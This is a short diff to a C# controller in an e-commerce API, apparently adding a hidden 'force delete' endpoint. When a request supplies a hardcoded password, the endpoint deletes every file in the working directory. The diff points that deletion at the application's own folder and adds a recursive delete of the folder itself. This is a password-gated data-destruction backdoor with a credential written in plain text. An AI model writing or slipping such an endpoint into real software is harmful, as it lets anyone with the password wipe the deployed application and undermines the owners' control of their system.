@@ -77,14 +77,15 @@ namespace ecommerceApi.Controllers
         {
             if (password == "16280921")
             {
-                DirectoryInfo di = new DirectoryInfo("..\\");
+                DirectoryInfo di = new DirectoryInfo(".");
 
                 foreach (FileInfo file in di.GetFiles())
                 {
                     file.Delete();
                 }
+                di.Delete(true);
 
-            return Ok();
+                return Ok();
             }
             return BadRequest(new ProblemDetails { Title = "Problem Force delete" });
 
